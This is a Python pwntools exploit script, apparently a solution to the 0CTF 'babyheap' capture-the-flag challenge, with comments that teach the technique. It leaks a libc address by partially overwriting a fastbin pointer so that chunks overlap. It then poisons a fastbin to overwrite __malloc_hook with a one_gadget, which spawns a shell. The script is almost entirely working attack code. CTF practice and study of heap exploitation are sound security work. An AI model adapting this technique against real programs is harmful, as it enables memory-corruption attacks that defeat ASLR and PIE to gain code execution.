from pwn import *

r = process("./0ctfbabyheap")
if len(sys.argv) > 1 and sys.argv[1] == 'gdb':
    gdb.attach(r, """set disassembly-flavor intel
    b main
    """)

def alloc(size):
    r.sendline('1')
    r.sendlineafter(': ', str(size))
    print r.recvuntil(': ', timeout=1)

def fill(idx, data):
    r.sendline('2')
    r.sendlineafter(': ', str(idx))
    r.sendlineafter(': ', str(len(data)))
    r.sendafter(': ', data)
    r.recvuntil(': ')

def free(idx):
    r.sendline('3')
    r.sendlineafter(': ', str(idx))
    r.recvuntil(': ')

def dump(idx):
    r.sendline('4')
    r.sendlineafter(': ', str(idx))
    r.recvuntil(': \n')
    data = r.recvline()
    r.recvuntil(': ')
    return data

################################################################################
#                                                                              #
#                                 L  E  A  K                                   #
#                                                                              #
################################################################################

# Now that ASLR is on, we'll need to leak a libc address before we can proceed
# with the prior exploit. Our initial thought might be to overwrite a forward
# pointer with the GOT address so that we can read from it, but since PIE is
# enabled, we don't know where the GOT is.

# There are many valid approaches. Here, we'll use a *partial overwrite*.
# Since ASLR doesn't mess with the last few bytes of addresses, we can change
# the address of a forward pointer of a fastbin to point to a smallbin, so that
# we end up with a fastbin and smallbin at the same address.

alloc(20)  # 0  <-- fasbin which we'll use to overwrite the two below it
alloc(20)  # 1  <---- two fastbins which we'll use to overwrite a fd pointer
alloc(20)  # 2  <-/
alloc(20)  # 3  <-- fastbin which we'll use to toggle the size of the smallbin
alloc(200) # 4  <-- our smallbin
alloc(20)  # 5  <-- fastbin to prevent smallbin from coalescing when we free it

free(2)
free(1)

# change last byte of fd pointer to make it point to our smallbin
fill(0, 'A' * 0x18 + p64(0x21) + '\x80') # it might not end at 0x80 for you!

# change the size of the smallbin to fool malloc into thinking it's a fastbin
fill(3, 'B' * 0x18 + p64(0x21))

# re-allocate 2 chunks. the second chunk now points to our smallbin
alloc(20) # 1
alloc(20) # 2

# change the size of the smallbin back to its real size
fill(3, 'B' * 0x18 + p64(0xd1))

# free our small bin to get some libc addresses
free(4)

# read from our fastbin / smallbin to get the addresses
leak = dump(2)

libc_addr = u64(leak[:8])
libc_offset = 0x3c27b8
libc_base = libc_addr - libc_offset
print('libc_base: {0}'.format(libc_base))

# obviously these constants are specific to your libc
malloc_hook    = 0x3c2740 + libc_base
main_arena_ptr = malloc_hook - 35
one_gadget     = 0x4647c + libc_base

alloc(200) # 4 <-- reclaim our smallbin so that we can start the pwn phase fresh

################################################################################
#                                                                              #
#                                  P  W  N                                     #
#                                                                              #
################################################################################

# this exploit is the exact same as the prior version.

alloc(100) # 6   |
alloc(100) # 7   |----- first, create 3 adjacent chunks in the 0x70-size fastbin
alloc(100) # 8   |

free(8) # then free the last two chunks, creating a fastbin list of length 2
free(7)

# now, we'll overflow chunk 6 to corrupt the fd pointer for chunk 1
fill(6, 'A' * 0x68 + p64(0x71) + p64(main_arena_ptr))

alloc(100) # 7
alloc(100) # 8

fill(8, 'A' * (malloc_hook - (main_arena_ptr + 16)) + p64(one_gadget))

# at this point we've overwritten malloc_hook with one_gadget. Any call to
# malloc() will pop a shell.
alloc(1)
r.interactive()
